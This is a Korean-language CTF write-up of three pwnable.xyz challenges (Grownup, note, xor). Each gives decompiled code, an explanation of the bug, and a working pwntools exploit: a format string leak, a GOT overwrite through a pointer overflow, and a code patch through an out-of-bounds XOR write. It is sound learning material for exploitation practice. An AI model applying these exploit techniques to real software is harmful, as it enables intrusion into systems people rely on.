# pwnable.xyz
## Grownup
~~~c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char *src; // ST08_8
  __int64 buf; // [rsp+10h] [rbp-20h]
  __int64 v6; // [rsp+18h] [rbp-18h]
  unsigned __int64 v7; // [rsp+28h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  setup();
  buf = 0LL;
  v6 = 0LL;
  printf("Are you 18 years or older? [y/N]: ", argv);
  *((_BYTE *)&buf + (signed int)((unsigned __int64)read(0, &buf, 0x10uLL) - 1)) = 0;
  if ( (_BYTE)buf != 'y' && (_BYTE)buf != 'Y' )
    return 0;
  src = (char *)malloc(0x84uLL);
  printf("Name: ", &buf);
  read(0, src, 0x80uLL);
  strcpy(usr, src);
  printf("Welcome ", src);
  printf(qword_601160, usr);
  return 0;
}
~~~
ida를 통해 본 코드는 위와 같다. 첫입력에서 y나 Y를 입력하지 않을 경우 프로그램이 멈춘다.
read를 한 것을 strcpy로 옮기는 것이 수상해서 검색해봤다. read는 null을 끝에 붙이지 않는데 strcpy는 null을 끝에 붙여준다.
좀 더 알아보니 포맷스트링 공격이 가능하다고 한다. 위 코드 경우 끝에 0x81에 null 값이 들어가서 포맷스트링 공격이 가능한 것이다.
data 부분을 조금 더 찾았더니 0x601080 주소에 flag가 있는 것을 확인했다. 내가 이해한 것은 0x80만큼 name부분에 집어넣어 포맷스트링을 
손상시키는 것이었는데 잘 안 되었다. 알고보니 처음에 y를 입력할 때 flag의 주소값을 입력해야 하는 거였다.
~~~python
from pwn import *
r=remote("svc.pwnable.xyz",30004)
flag=0x601080
pay=''
pay+='Y'+'A'*7+p32(flag)
r.recvuntil("[y/N]: ")
r.sendline(pay)
formatstr='%p%p%p%p%p%p%p%p%s%p%p%p'
pay=''
pay+='A'*60+formatstr+'A'*(0x80-len(formatstr)-32)
r.recvuntil("Name: ")
r.sendline(pay)
print r.recvall()
~~~
writeup을 참고하여 짜게 된 exploitcode이다. 우선 18살 이상이냐고 물을 때 y와 dummy(7) 그리고 flag 주소를 little endian으로 넣어줬다.
다음 formatstr을 통해 몇번째에 flag가 나타나는지 확인하고 그 부분을 %s로 바꾸어 flag를 확인했다.
## note
~~~c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  const char *v3; // rdi
  int v4; // eax

  setup(*(_QWORD *)&argc, argv, envp);
  v3 = "Note taking 101.";
  puts("Note taking 101.");
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        print_menu(v3);
        v4 = read_int32();
        if ( v4 != 1 )
          break;
        edit_note();
      }
      if ( v4 != 2 )
        break;
      edit_desc();
    }
    if ( !v4 )
      break;
    v3 = "Invalid";
    puts("Invalid");
  }
  return 0;
}
~~~
코드는 위와 같았고 ida 옆에 win이라는 함수가 있길래 들어갔더니
~~~c
int win()
{
  return system("cat flag");
}
~~~
system 함수로 flag 값을 보여주는 것을 알 수 있었다. 이 함수의 주소를 사용하면 될 듯하다. buf에 값을 주는
함수를 찾았더니 edit_note와 edit_desc가 있었다. 이때 edit_note에서 정보를 받는 s의 32비트 밑에 buf가 있다.
~~~
.bss:0000000000601480 ; char s[32]
.bss:0000000000601480 s               db 20h dup(?)           ; DATA XREF: edit_note+67↑o
.bss:00000000006014A0 ; void *buf
.bss:00000000006014A0 buf             dq ?                    ; DATA XREF: edit_desc+4↑r
.bss:00000000006014A0                                         ; edit_desc+1A↑w ...
.bss:00000000006014A0 _bss            ends
~~~
그러니까 read 함수의 got를 구한 뒤 edit_note에 32비트의 dummy와 함께 got를 넣어 buf를 바꾸어놓은 후
다시 edit_note를 통해 win함수의 주소를 넣어 flag를 확인하면 된다.
~~~
.got.plt:0000000000601248 off_601248      dq offset read          ; DATA XREF: _read↑r
~~~
read()의 주소이다. 그리고 win함수의 주소는 0x40093c이다.
아래는 exploit code이다.
~~~python
from pwn import *

r = remote("svc.pwnable.xyz", 30016)

r.sendafter("> ","1")

r.sendafter("len? ","100")

r.sendafter("note: ","A"*32 + p64(0x601248))

r.sendafter("> ","2")

r.sendafter("desc: ",p64(0x40093c))

r.sendafter("> ","2")

print r.recvall()
~~~
## xor
~~~
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+Ch] [rbp-24h]
  __int64 v4; // [rsp+10h] [rbp-20h]
  __int64 v5; // [rsp+18h] [rbp-18h]
  __int64 v6; // [rsp+20h] [rbp-10h]
  unsigned __int64 v7; // [rsp+28h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  puts("The Poopolator");
  setup("The Poopolator", argv);
  while ( 1 )
  {
    v6 = 0LL;
    printf(format);
    v3 = _isoc99_scanf("%ld %ld %ld", &v4, &v5, &v6);
    if ( !v4 || !v5 || !v6 || v6 > 9 || v3 != 3 )
      break;
    result[v6] = v5 ^ v4;
    printf("Result: %ld\n", result[v6]);
  }
  exit(1);
}
~~~
ida로 main을 열었을 때 코드이고 여기도 역시 win()함수를 통해 flag를 제공한다. 따라서 이 주소를 사용하는것을 알 수 있다. 그리고 checksec을 해줬더니 full-relro 가 켜져 있어서 앞의 문제와 같이 got를 사용한
공격은 하지 못한다. 
~~~
pwndbg> cat /proc/52263/maps
55df929f8000-55df929f9000 rwxp 00000000 08:01 1572913                    /home/neururaon/Documents/challenge2
55df92bf9000-55df92bfa000 r--p 00001000 08:01 1572913                    /home/neururaon/Documents/challenge2
55df92bfa000-55df92bfb000 rw-p 00002000 08:01 1572913                    /home/neururaon/Documents/challenge2
55df935f6000-55df93617000 rw-p 00000000 00:00 0                          [heap]
7f38436ce000-7f38438b5000 r-xp 00000000 08:01 1184894                    /lib/x86_64-linux-gnu/libc-2.27.so
7f38438b5000-7f3843ab5000 ---p 001e7000 08:01 1184894                    /lib/x86_64-linux-gnu/libc-2.27.so
7f3843ab5000-7f3843ab9000 r--p 001e7000 08:01 1184894                    /lib/x86_64-linux-gnu/libc-2.27.so
7f3843ab9000-7f3843abb000 rw-p 001eb000 08:01 1184894                    /lib/x86_64-linux-gnu/libc-2.27.so
7f3843abb000-7f3843abf000 rw-p 00000000 00:00 0 
7f3843abf000-7f3843ae6000 r-xp 00000000 08:01 1184866                    /lib/x86_64-linux-gnu/ld-2.27.so
7f3843ccf000-7f3843cd1000 rw-p 00000000 00:00 0 
7f3843ce6000-7f3843ce7000 r--p 00027000 08:01 1184866                    /lib/x86_64-linux-gnu/ld-2.27.so
7f3843ce7000-7f3843ce8000 rw-p 00028000 08:01 1184866                    /lib/x86_64-linux-gnu/ld-2.27.so
7f3843ce8000-7f3843ce9000 rw-p 00000000 00:00 0 
7fffb1fb8000-7fffb1fd9000 rw-p 00000000 00:00 0                          [stack]
7fffb1fea000-7fffb1fed000 r--p 00000000 00:00 0                          [vvar]
7fffb1fed000-7fffb1fee000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
~~~
process map을 통해 55df929f8000-55df929f9000에 rwxp 권한이 있다는 것을 알 수 있었다. 따라서 기계어를 써서
저 부분을 call win으로 바꾸어 준다. win의 주소는 0xA21이다. v5^v4의 결과값이 call win을 little endian한 값이
되도록 해야 한다. 자력으로 해보려 했으나 잘 되지 않아 writeup을 참고한 결과 0xac8 즉 call exit의 주소부부분을
call 0xA21로 바꾸어 주면 풀린다. 참고하여 짠 exploit code는 아래와 같다.
~~~python
from pwn import *

#p = process('./xor')
p = remote('svc.pwnable.xyz', 30029)
e = ELF('./challenge2')

exit = 0xac8

e.asm(exit, "call 0xa21") 
result = e.read(exit, 5)
result = int(result[::-1].encode("Hex"), 16) 

payload = ''
payload += "1 "
payload += str(result ^ 1) + ' '
payload += str((exit - 0x202200) / 8)

p.sendlineafter('  ', payload)
p.sendlineafter('  ', 'A') 
p.interactive()
~~~
